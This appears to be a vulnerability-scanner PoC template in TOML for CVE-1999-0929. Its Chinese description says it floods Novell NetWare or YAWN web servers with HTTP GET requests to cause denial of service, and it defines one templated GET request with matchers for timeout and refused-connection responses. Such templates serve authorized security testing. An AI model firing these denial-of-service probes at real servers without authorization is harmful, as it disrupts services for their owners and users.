[info]
author = "AVE"
description = "向 Novell NetWare Novell-HTTP-Server 或 YAWN Web 服务器发送大量 HTTP GET 请求，耗尽服务器资源导致拒绝服务"
id = "POC-AVE-1999-0729"
name = "CVE-1999-0929 PoC"
severity = "medium"
tags = ["cve-1999-0929"]
vuln_id = [
    "CVE-1999-0929",
    "AVE-1999-0729",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection refused",
    "timeout",
    "No route to host",
]
